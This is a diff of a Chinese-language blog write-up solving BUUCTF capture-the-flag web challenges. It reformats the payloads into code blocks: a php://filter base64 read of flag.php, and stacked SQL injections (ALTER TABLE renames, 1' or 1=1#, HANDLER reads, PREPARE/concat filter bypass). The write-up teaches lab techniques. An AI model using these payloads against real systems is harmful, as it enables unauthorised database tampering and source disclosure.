@@ -52,7 +52,8 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
 <p>这是一段php代码，通过阅读发现是以GET方式传入cat,直接输出了cst的值，如果cat的值为dog，则将输出’Syc{cat_cat_cat_cat}’</p>
 <p>显然，有猫腻</p>
 <p>于是尝试着传入cat的值为dog，即</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://81f1cbcd-6139-49ff-8fca-aa6cbfc2bf22.node4.buuoj.cn:81/?cat=dog" >http://81f1cbcd-6139-49ff-8fca-aa6cbfc2bf22.node4.buuoj.cn:81/?cat=dog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cat=dog</span><br></pre></td></tr></table></div></figure>
+
 <p>回车一下，我们可以惊讶地发现：</p>
 <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111029878.png" alt="image-20220111102948803"></p>
 <p>它它它，它出来了！</p>
@@ -67,7 +68,8 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
 <p>显然，这是暗示，也是挑衅。注意这里的url格式，这不是文件源码，应想办法读取文件源码</p>
 <p>通过查阅资料（<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html%EF%BC%89" >https://www.cnblogs.com/wjrblogs/p/12285202.html）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <p>于是得到</p>
-<p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>
+
 <p>此时得到一堆奇奇怪怪的东西：</p>
 <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111030104.png" alt="image-20220111103028071"></p>
 <p>这是base64的编码输出，可以借助Cyberchef解密</p>
@@ -80,7 +82,10 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
           <a href="#四、-强网杯-2019-随便注-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、-强网杯-2019-随便注-1" class="headerlink" title="四、[强网杯 2019]随便注 1"></a>四、[强网杯 2019]随便注 1</h1>
       <p>打开后界面如下</p>
 <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111031114.png" alt="image-20220111103127081"></p>
-<p>首先尝试一下提交 1，于是出现</p>
+<p>首先尝试一下提交 </p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></div></figure>
+
+<p>于是出现</p>
 <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111031575.png" alt="image-20220111103139551"></p>
 <p>再用单引号判断是否有sql注入</p>
 <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111124303.png" alt="image-20220111112439269"></p>
@@ -92,11 +97,14 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
 <p>再分别查看表的结构</p>
 <p>1919810931114514:</p>
 <p>输入</p>
-<p>‘;show columns from <code>1919810931114514</code>;（数字前后是反单引号，不是单引号）</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;show columns from `1919810931114514`;</span><br></pre></td></tr></table></div></figure>
+
+<p>（数字前后是反单引号，不是单引号）</p>
 <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111145132.png" alt="image-20220111114557095"></p>
 <p>words:</p>
 <p>输入</p>
-<p>‘;show columns from words;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;show columns from words;</span><br></pre></td></tr></table></div></figure>
+
 <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111147277.png" alt="image-20220111114739233"></p>
 <p>显然，flag存在于1919810931114514表中</p>
 
@@ -106,24 +114,31 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改表名(将表名user改为users)</span><br><span class="line">alter table user rename to users;</span><br><span class="line"></span><br><span class="line">修改列名(将字段名username改为name)</span><br><span class="line">alter table users change uesrname name varchar(30);</span><br></pre></td></tr></table></div></figure>
 
 <p>即</p>
-<p>‘；alter table words rename to word1;alter table <code>1919810931114514</code> rename to words;alter table words change flag id varchar(50);#</p>
-<p>最后再输入1’ or 1=1#</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘；alter table words rename to word1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#</span><br></pre></td></tr></table></div></figure>
+
+<p>最后再输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br></pre></td></tr></table></div></figure>
+
 <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111304918.png" alt="image-20220111130409886"></p>
 
         <h3 id="法Ⅱ：利用open和handler"   >
           <a href="#法Ⅱ：利用open和handler" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：利用open和handler" class="headerlink" title="法Ⅱ：利用open和handler"></a>法Ⅱ：利用open和handler</h3>
       <p>输入</p>
-<p>‘;handler <code>1919810931114514</code> open as <code>a</code>;handler <code>a</code> read next;#</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;handler `1919810931114514` open as `a`;handler `a` read next;#</span><br></pre></td></tr></table></div></figure>
+
 <p>（PS：a可随意变换名称）</p>
 <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111450381.png" alt="image-20220111145029306"></p>
 
         <h3 id="法Ⅲ：MySQL的预处理"   >
           <a href="#法Ⅲ：MySQL的预处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅲ：MySQL的预处理" class="headerlink" title="法Ⅲ：MySQL的预处理"></a>法Ⅲ：MySQL的预处理</h3>
-      <p>尝试一下输入select</p>
+      <p>尝试一下输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select</span><br></pre></td></tr></table></div></figure>
+
 <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111457444.png" alt="image-20220111145750389"></p>
 <p>得出括号里的一堆都被过滤掉了，可以利用预处理机制prepare和concat函数拼接获得select，再用exeute来执行，通过大写绕过</p>
 <p>输入</p>
-<p>‘;PREPARE st from concat(‘sel’,’ect’,  ‘* from <code>1919810931114514</code>‘);EXECUTE st;#</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;PREPARE st from concat(&#x27;sel&#x27;,&#x27;ect&#x27;,  &#x27;* from `1919810931114514`&#x27;);EXECUTE st;#</span><br></pre></td></tr></table></div></figure>
+
 <p>（PS：括号里前两个单引号的内容合在一起应该是被过滤掉的东西，但必须分开）</p>
 <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201111505373.png" alt="image-20220111150552285"></p>
 <p>OVER！</p>
